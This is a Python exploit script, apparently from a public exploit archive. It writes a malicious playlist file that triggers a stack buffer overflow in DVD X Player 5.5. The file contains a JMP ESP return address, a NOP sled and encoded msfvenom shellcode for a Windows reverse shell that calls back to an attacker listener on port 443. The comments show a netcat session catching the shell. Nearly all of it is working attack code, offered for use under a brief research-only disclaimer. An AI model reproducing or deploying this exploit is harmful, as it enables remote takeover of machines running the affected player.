#!/usr/bin/python
#
# July 2017 | github.com/rafaveira3
#
# Exploit DVD X Player 5.5 - Playlist .sfl  Buffer Overflow
#
# How I tested it:
# - Windows XP SP2 (Metasploitable will do) and Kali.
# - Download and install vulnerable service on Windows XP (WARNING! THIS IS A VULNERABLE SERVICE)
# - http://www.exploit-db.com/wp-content/themes/exploit/applications/cdfda7217304f4deb7d2e8feb5696394-DVDXPlayerSetup.exe
# - pattern_create.rb and pattern_offset.rb = 260
# - Bachars = \x00\x0a\x0d\x1a
# - Return Address found at 0x616525cb (JMP ESP) | EPG.dll
# - Generated the payload using msfvenom
#
# PoC:
# Windows XP:
#    C:\Python27>python.exe exploit-dvdxplayer.py
#    C:\Python27> 
#    - Open DVD X Player 5.5, click on "Later", "Open Playlist...", and select C:\Python27\exploit.plf  
# Kali:
#    root@kali:~# nc -nlvp 443
#    listening on [any] 443 ...
#    connect to [10.0.0.36] from (UNKNOWN) [10.0.0.44] 1047
#    Microsoft Windows XP [versï¿½o 5.1.2600]
#    (C) Copyright 1985-2001 Microsoft Corp.
#
#    C:\Python27>
#
# Disclaimer: PLEASE! This is for research purposes only, and should only be used on authorized systems.
# Accessing a computer system or network without authorization or explicit permission is illegal.
#
#

eip = "\xcb\x25\x65\x61"
nops = "\x90"*100
filename = "exploit.plf"

# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.0.0.36 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x1a" 
#Payload size: 351 bytes

shellcode = ("\xbd\xb1\xd0\x2c\xb6\xd9\xc2\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x52\x31\x6a\x12\x83\xc2\x04\x03\xdb\xde\xce\x43\xe7\x37\x8c"
"\xac\x17\xc8\xf1\x25\xf2\xf9\x31\x51\x77\xa9\x81\x11\xd5\x46"
"\x69\x77\xcd\xdd\x1f\x50\xe2\x56\x95\x86\xcd\x67\x86\xfb\x4c"
"\xe4\xd5\x2f\xae\xd5\x15\x22\xaf\x12\x4b\xcf\xfd\xcb\x07\x62"
"\x11\x7f\x5d\xbf\x9a\x33\x73\xc7\x7f\x83\x72\xe6\x2e\x9f\x2c"
"\x28\xd1\x4c\x45\x61\xc9\x91\x60\x3b\x62\x61\x1e\xba\xa2\xbb"
"\xdf\x11\x8b\x73\x12\x6b\xcc\xb4\xcd\x1e\x24\xc7\x70\x19\xf3"
"\xb5\xae\xac\xe7\x1e\x24\x16\xc3\x9f\xe9\xc1\x80\xac\x46\x85"
"\xce\xb0\x59\x4a\x65\xcc\xd2\x6d\xa9\x44\xa0\x49\x6d\x0c\x72"
"\xf3\x34\xe8\xd5\x0c\x26\x53\x89\xa8\x2d\x7e\xde\xc0\x6c\x17"
"\x13\xe9\x8e\xe7\x3b\x7a\xfd\xd5\xe4\xd0\x69\x56\x6c\xff\x6e"
"\x99\x47\x47\xe0\x64\x68\xb8\x29\xa3\x3c\xe8\x41\x02\x3d\x63"
"\x91\xab\xe8\x24\xc1\x03\x43\x85\xb1\xe3\x33\x6d\xdb\xeb\x6c"
"\x8d\xe4\x21\x05\x24\x1f\xa2\x20\xb9\x1f\x16\x5d\xbb\x1f\x57"
"\x26\x32\xf9\x3d\x48\x13\x52\xaa\xf1\x3e\x28\x4b\xfd\x94\x55"
"\x4b\x75\x1b\xaa\x02\x7e\x56\xb8\xf3\x8e\x2d\xe2\x52\x90\x9b"
"\x8a\x39\x03\x40\x4a\x37\x38\xdf\x1d\x10\x8e\x16\xcb\x8c\xa9"
"\x80\xe9\x4c\x2f\xea\xa9\x8a\x8c\xf5\x30\x5e\xa8\xd1\x22\xa6"
"\x31\x5e\x16\x76\x64\x08\xc0\x30\xde\xfa\xba\xea\x8d\x54\x2a"
"\x6a\xfe\x66\x2c\x73\x2b\x11\xd0\xc2\x82\x64\xef\xeb\x42\x61"
"\x88\x11\xf3\x8e\x43\x92\x03\xc5\xc9\xb3\x8b\x80\x98\x81\xd1"
"\x32\x77\xc5\xef\xb0\x7d\xb6\x0b\xa8\xf4\xb3\x50\x6e\xe5\xc9"
"\xc9\x1b\x09\x7d\xe9\x09")

buffer = "A"*260 + eip + nops + shellcode + "C"*(2000-260-4-100-351)

textfile = open(filename, 'w')
textfile.write(buffer)
textfile.close()
